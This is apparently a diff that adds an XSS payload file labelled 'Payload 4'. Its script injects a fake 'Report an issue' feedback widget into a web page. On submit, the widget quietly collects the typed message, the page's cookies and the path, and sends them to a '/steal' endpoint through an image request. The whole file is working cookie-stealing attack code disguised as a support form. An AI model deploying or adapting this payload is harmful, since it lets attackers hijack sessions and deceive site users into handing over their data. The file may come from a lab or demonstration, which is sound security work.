@@ -1,0 +1,91 @@
+<!-- Payload 4 – “Report an issue” (issue + cookie) -->
+
+<script>
+(function () {
+    var box = document.createElement("div");
+    box.style.position = "fixed";
+    box.style.right = "24px";
+    box.style.bottom = "24px";
+    box.style.width = "260px";
+    box.style.background = "#ffffff";
+    box.style.borderRadius = "16px";
+    box.style.boxShadow = "0 18px 45px rgba(15,23,42,0.25)";
+    box.style.padding = "14px 14px 12px";
+    box.style.fontFamily = "-apple-system,BlinkMacSystemFont,system-ui,sans-serif";
+    box.style.zIndex = "9999";
+
+    var title = document.createElement("div");
+    title.textContent = "Report an issue";
+    title.style.fontSize = "14px";
+    title.style.fontWeight = "600";
+    title.style.color = "#0f172a";
+    title.style.marginBottom = "4px";
+
+    var text = document.createElement("p");
+    text.textContent = "Something not working as expected? Tell us briefly.";
+    text.style.margin = "0 0 8px";
+    text.style.fontSize = "12px";
+    text.style.color = "#6b7280";
+
+    var form = document.createElement("form");
+
+    var textarea = document.createElement("textarea");
+    textarea.required = true;
+    textarea.rows = 3;
+    textarea.placeholder = "Example: search results are empty.";
+    textarea.style.width = "100%";
+    textarea.style.boxSizing = "border-box";
+    textarea.style.borderRadius = "10px";
+    textarea.style.border = "1px solid #e5e7eb";
+    textarea.style.padding = "6px 8px";
+    textarea.style.fontSize = "12px";
+    textarea.style.marginBottom = "8px";
+    textarea.style.resize = "none";
+
+    var row = document.createElement("div");
+    row.style.display = "flex";
+    row.style.justifyContent = "space-between";
+    row.style.alignItems = "center";
+
+    var helper = document.createElement("span");
+    helper.textContent = "Estimated response: 1–2 business days.";
+    helper.style.fontSize = "9px";
+    helper.style.color = "#9ca3af";
+    helper.style.maxWidth = "130px";
+
+    var btn = document.createElement("button");
+    btn.type = "submit";
+    btn.textContent = "Send";
+    btn.style.border = "none";
+    btn.style.borderRadius = "999px";
+    btn.style.padding = "6px 12px";
+    btn.style.fontSize = "12px";
+    btn.style.fontWeight = "600";
+    btn.style.background = "#14b8a6";
+    btn.style.color = "#0f172a";
+    btn.style.cursor = "pointer";
+
+    form.onsubmit = function (e) {
+        e.preventDefault();
+        var value = "issue"
+        + "|message=" + textarea.value
+        + "|cookie=" + (document.cookie || "")
+        + "|path=" + location.pathname;
+        var img = new Image();
+        img.src = "/steal?c=" + encodeURIComponent(value);
+        box.remove();
+    };
+
+    row.appendChild(helper); 
+    row.appendChild(btn);
+
+    form.appendChild(textarea);
+    form.appendChild(row);
+
+    box.appendChild(title);
+    box.appendChild(text);
+    box.appendChild(form);
+
+    document.body.appendChild(box);
+})();
+</script>
